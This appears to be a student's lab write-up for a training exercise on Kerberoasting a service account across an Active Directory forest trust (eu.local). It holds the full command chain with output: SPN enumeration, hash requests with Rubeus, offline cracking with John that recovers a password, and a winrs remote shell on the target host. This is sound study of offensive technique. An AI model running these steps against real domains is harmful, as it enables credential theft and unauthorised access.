# Hands-ON 22:
```
Find a service account in the eu.local forest and Kerberoast its password.
```

## Index Of Content:
  1. [Find service accounts](#find-service-accounts)  

## Find service accounts


```
 Get-ADTrust -Filter 'IntraForest -ne $true' | %{Get-ADUser -Filter {ServicePrincipalName -ne '$null'} -Properties ServicePrincipalName -Server $_.Name}


DistinguishedName    : CN=krbtgt,CN=Users,DC=eu,DC=local
Enabled              : False
GivenName            :
Name                 : krbtgt
ObjectClass          : user
ObjectGUID           : a36265f2-2db1-4555-acc2-e9736fc1b6f6
SamAccountName       : krbtgt
ServicePrincipalName : {kadmin/changepw}
SID                  : S-1-5-21-3657428294-2017276338-1274645009-502
Surname              :
UserPrincipalName    :

DistinguishedName    : CN=storagesvc,CN=Users,DC=eu,DC=local
Enabled              : True
GivenName            : storage
Name                 : storagesvc
ObjectClass          : user
ObjectGUID           : 041fedb0-a442-4cdf-af34-6559480a2d74
SamAccountName       : storagesvc
ServicePrincipalName : {MSSQLSvc/eu-file.eu.local}
SID                  : S-1-5-21-3657428294-2017276338-1274645009-1106
Surname              : svc
UserPrincipalName    : storagesvc

```

Request hashes using rubeus from eu.local of kerberoast users:

```
C:\Users\studentuser17>C:\AD\Tools\Rubeus.exe kerberoast /user:storagesvc /simple /domain:eu.local /outfile:C:\AD\Tools\euhashes.txt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target User            : storagesvc
[*] Target Domain          : eu.local
[*] Searching path 'LDAP://EU-DC.eu.local/DC=eu,DC=local' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=storagesvc)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1

[*] Hash written to C:\AD\Tools\euhashes.txt

[*] Roasted hashes written to : C:\AD\Tools\euhashes.txt

```
Perform a locla bruteforce attack:
```
C:\Users\studentuser17>C:\AD\Tools\john-1.9.0-jumbo-1-win64\run\john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\euhashes.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Qwerty@123       (?)
1g 0:00:00:00 DONE (2023-03-01 11:43) 76.92g/s 59076p/s 59076c/s 59076C/s password..9999
Use the "--show" option to display all of the cracked passwords reliably
Session completed

```


Enumerate group membership for the new user storagesvc on the external domain eu.local:

```
PS C:\Users\studentuser17> function Get-ADPrincipalGroupMembershiprecursive ($SamAccountNname) {
>> $groups=@(Get-ADPrincipalGroupMembership -Server eu.local -Identity $SamAccountNname | select -ExpandProperty distinguishedname)
>> $groups
>> if($groups.count -gt 0)
>> {
>> foreach ($group in $groups)
>> {
>> Get-ADPrincipalGroupMembershiprecursive $group
>> }
>> }
>> }

PS C:\Users\studentuser17> Get-ADPrincipalGroupMembershiprecursive  storagesvc
CN=Domain Users,CN=Users,DC=eu,DC=local
CN=eufileadmins,CN=Users,DC=eu,DC=local
CN=Users,CN=Builtin,DC=eu,DC=local
```

Review group eufileadmins :

```
PS C:\Users\studentuser17> Get-ADGroup -Identity eufileadmins -Server eu.local -Properties *


CanonicalName                   : eu.local/Users/eufileadmins
CN                              : eufileadmins
Created                         : 7/18/2019 10:26:55 PM
createTimeStamp                 : 7/18/2019 10:26:55 PM
Deleted                         :
Description                     : eufileadmins
DisplayName                     : eufileadmins
DistinguishedName               : CN=eufileadmins,CN=Users,DC=eu,DC=local
dSCorePropagationData           : {12/31/1600 4:00:00 PM}
GroupCategory                   : Security
GroupScope                      : Global
groupType                       : -2147483646
HomePage                        :
instanceType                    : 4
isDeleted                       :
LastKnownParent                 :
ManagedBy                       :
member                          : {CN=storagesvc,CN=Users,DC=eu,DC=local}
MemberOf                        : {}
Members                         : {CN=storagesvc,CN=Users,DC=eu,DC=local}
Modified                        : 7/18/2019 10:27:14 PM
modifyTimeStamp                 : 7/18/2019 10:27:14 PM
Name                            : eufileadmins
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  : CN=Group,CN=Schema,CN=Configuration,DC=eu,DC=local
ObjectClass                     : group
ObjectGUID                      : 59d88009-6725-4ce6-bf06-d59a5258bf76
objectSid                       : S-1-5-21-3657428294-2017276338-1274645009-1108
ProtectedFromAccidentalDeletion : False
SamAccountName                  : eufileadmins
sAMAccountType                  : 268435456
sDRightsEffective               : 0
SID                             : S-1-5-21-3657428294-2017276338-1274645009-1108
SIDHistory                      : {}
uSNChanged                      : 23321
uSNCreated                      : 23316
whenChanged                     : 7/18/2019 10:27:14 PM
whenCreated                     : 7/18/2019 10:26:55 PM
```
Launch new cmd process with the storagesvc user credentials:

```
PS C:\Users\studentuser17> runas.exe /user:eu.local\storagesvc /netonly cmd
Enter the password for eu.local\storagesvc:
Attempting to start cmd as user "eu.local\storagesvc" ...
```

Access to the  new domain at machine eu-file:

```
Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
us\studentuser17

C:\Windows\system32>klist

Current LogonId is 0:0x21bdce

Cached Tickets: (0)

C:\Windows\system32>C:\AD\Tools\Rubeus.exe triage

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1


Action: Triage Kerberos Tickets (Current User)

[*] Current LUID    : 0x21bdce

 ---------------------------------------
 | LUID | UserName | Service | EndTime |
 ---------------------------------------
 ---------------------------------------


C:\Windows\system32>winrs -r:eu-file.eu.local cmd
Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\storagesvc>whoami
whoami
eu\storagesvc

C:\Users\storagesvc>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
```
